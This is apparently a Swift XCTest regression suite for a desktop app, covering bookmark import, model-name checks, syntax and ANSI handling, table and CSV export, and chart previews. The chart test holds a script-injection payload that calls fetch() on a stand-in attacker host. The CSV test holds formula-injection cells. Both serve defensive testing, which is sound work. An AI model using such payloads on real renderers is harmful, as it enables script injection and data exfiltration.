import Foundation
import SwiftUI
import XCTest
@testable import TurboSparkApp

/// Regression tests for the Low review findings in the Images, Import,
/// Installation, Presentation and Server areas.
final class LowFindingsImagesInstallPresentationTests: XCTestCase {
    // MARK: Import

    func testChromeBookmarkWithEmptyNameFallsBackToHost() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString, isDirectory: true)
        let profile = root.appendingPathComponent("Default", isDirectory: true)
        try FileManager.default.createDirectory(at: profile, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let json = #"{"roots":{"bookmark_bar":{"type":"folder","id":"1","name":"Bar","children":[{"type":"url","id":"2","name":"","url":"https://icon.example/path"}]}}}"#
        try Data(json.utf8).write(to: profile.appendingPathComponent("Bookmarks"))
        let importer = ChromeBookmarkImporter(profileRootURL: root)
        let profileID = try XCTUnwrap(importer.enumerateProfiles().profiles.first?.id)
        _ = importer.preview(profileIDs: [profileID])
        let result = importer.importConfirmed(selectionsByProfileID: [profileID: ["root:bookmark_bar"]])
        XCTAssertEqual(result.importedBookmarkCount, 1)
        XCTAssertEqual(result.trees.first?.folders.first?.bookmarks.map(\.title), ["icon.example"])
    }

    // MARK: Installation

    func testHuggingFaceRepoLinkRejectsScanTags() {
        XCTAssertTrue(ModelFeatureDescriptor.isHuggingFaceRepo("mlx-community/Qwen3-4B"))
        XCTAssertFalse(ModelFeatureDescriptor.isHuggingFaceRepo("custom/foo"))
        XCTAssertFalse(ModelFeatureDescriptor.isHuggingFaceRepo("lm studio/foo"))
        XCTAssertFalse(ModelFeatureDescriptor.isHuggingFaceRepo("local"))
        XCTAssertFalse(ModelFeatureDescriptor.isHuggingFaceRepo("a/b/c"))
    }

    func testRecommendationMoEUsesExactFamilySet() {
        XCTAssertTrue(ModelFeatureDescriptor.isKnownMoEFamily("gemma4"))
        XCTAssertTrue(ModelFeatureDescriptor.isKnownMoEFamily("Mixtral"))
        // Alias-substring matching used to label these dense families as MoE.
        XCTAssertFalse(ModelFeatureDescriptor.isKnownMoEFamily("ornith"))
        XCTAssertFalse(ModelFeatureDescriptor.isKnownMoEFamily("qwen38"))
        XCTAssertFalse(ModelFeatureDescriptor.isKnownMoEFamily(nil))
    }

    // MARK: Presentation

    func testHighlighterKeepsDigitsInsideIdentifiers() throws {
        let highlighted = try XCTUnwrap(CodeSyntaxHighlighter.highlight("let in2 = u8", language: "swift"))
        var colored: [String] = []
        for run in highlighted.runs where run.foregroundColor != nil {
            colored.append(String(highlighted[run.range].characters))
        }
        XCTAssertTrue(colored.contains("let"))
        XCTAssertFalse(colored.contains("in"), "the prefix of in2 must not color as a keyword: \(colored)")
        XCTAssertFalse(colored.contains("8"), "the suffix of u8 must not color as a number: \(colored)")
    }

    func testANSISegmentsHandleManyEscapesQuickly() {
        let unit = "\u{1B}[31mred\u{1B}[0m plain "
        let text = String(repeating: unit, count: 20_000)
        let start = Date()
        let segments = ANSIColorizer.segments(in: text)
        XCTAssertLessThan(Date().timeIntervalSince(start), 5, "segments must be linear in the escape count")
        XCTAssertEqual(segments.map(\.text).joined(), String(repeating: "red plain ", count: 20_000))
        // Edge: a trailing lone ESC and a truncated CSI do not crash.
        XCTAssertEqual(ANSIColorizer.segments(in: "a\u{1B}").map(\.text).joined(), "a")
        XCTAssertEqual(ANSIColorizer.segments(in: "a\u{1B}[").map(\.text).joined(), "a")
    }

    func testStripAnsiKeepsCurlyQuotesAndStripsC1Scalars() {
        // U+201C/U+201D end in UTF-8 continuation bytes 0x9C/0x9D.
        let title = "\u{1B}]0;\u{201C}build\u{201D}\u{07}done"
        XCTAssertEqual(ToolOutputFormatter.stripAnsi(title), "done")
        XCTAssertEqual(ToolOutputFormatter.stripAnsi("\u{201C}quoted\u{201D}\u{1B}[0m"), "\u{201C}quoted\u{201D}")
        // Real C1 scalars: CSI (U+009B) and OSC terminated by ST (U+009C).
        XCTAssertEqual(ToolOutputFormatter.stripAnsi("a\u{9B}31mb"), "ab")
        XCTAssertEqual(ToolOutputFormatter.stripAnsi("a\u{9D}0;title\u{9C}b"), "ab")
    }

    func testTableSortIgnoresBlankCellsAndSortsThemLast() {
        let grid = MarkdownTableGrid(header: ["n"], rows: [["10"], [""], ["9"], ["100"]])
        let asc = grid.sorted(byColumn: 0, direction: .ascending).rows.map { $0[0] }
        XCTAssertEqual(asc, ["9", "10", "100", ""])
        let desc = grid.sorted(byColumn: 0, direction: .descending).rows.map { $0[0] }
        XCTAssertEqual(desc, ["100", "10", "9", ""])
    }

    func testCSVFormulaGuardLeavesPlainNumbersAlone() {
        let grid = MarkdownTableGrid(header: ["d"], rows: [["-5"], ["+3.2"], ["-1,200"], ["=1+1"], ["-cmd"]])
        let lines = grid.csv().split(separator: "\n").map(String.init)
        XCTAssertEqual(lines[1], "-5")
        XCTAssertEqual(lines[2], "+3.2")
        XCTAssertEqual(lines[3], "\"-1,200\"")
        XCTAssertEqual(lines[4], "'=1+1")
        XCTAssertEqual(lines[5], "'-cmd")
    }

    func testOfficeParserIgnoresTabStopDefinitions() throws {
        let xml = """
        <w:document xmlns:w="w"><w:body><w:tbl><w:tr>
        <w:tc><w:p><w:pPr><w:tabs><w:tab w:val="left" w:pos="720"/></w:tabs></w:pPr><w:r><w:t>A</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>B</w:t></w:r><w:r><w:tab/><w:t>C</w:t></w:r></w:p></w:tc>
        </w:tr></w:tbl></w:body></w:document>
        """
        let text = try FlowingTextXMLParser().parse(Data(xml.utf8))
        XCTAssertEqual(text.trimmingCharacters(in: .whitespacesAndNewlines), "A\tB\tC")
    }

    func testChartPreviewEmbedsJSONAsDataAndRejectsScript() throws {
        let ok = try XCTUnwrap(CodeBlockContainer<EmptyView>.chartHTML(
            language: "echarts", code: #"{"title":{"text":"</script><b>"}}"#))
        XCTAssertTrue(ok.contains(#"type="application/json""#))
        XCTAssertTrue(ok.contains("JSON.parse"))
        XCTAssertFalse(ok.contains("</script><b>"), "a closing script tag in a label must be escaped")
        let attack = #"{}); fetch('https://attacker.example/'); ({}"#
        XCTAssertNil(CodeBlockContainer<EmptyView>.chartHTML(language: "echarts", code: attack))
        XCTAssertNil(CodeBlockContainer<EmptyView>.chartHTML(language: "chartjs", code: attack))
        XCTAssertNil(CodeBlockContainer<EmptyView>.chartHTML(language: "swift", code: "{}"))
    }

    func testGreetingResolvesScriptAndRegionKeys() {
        let t = ["en": "Hello", "zh-Hans": "Simp", "zh-Hant": "Trad", "pt-BR": "Ola", "fr": "Salut"]
        func pick(_ id: String) -> String {
            Greeting.resolve(t, for: Locale.Language(identifier: id), fallbackID: "x")
        }
        XCTAssertEqual(pick("zh-Hans"), "Simp")
        XCTAssertEqual(pick("zh_TW"), "Trad")
        XCTAssertEqual(pick("zh-CN"), "Simp")
        XCTAssertEqual(pick("pt"), "Ola")
        XCTAssertEqual(pick("fr-CA"), "Salut")
        XCTAssertEqual(pick("de"), "Hello")
    }
}
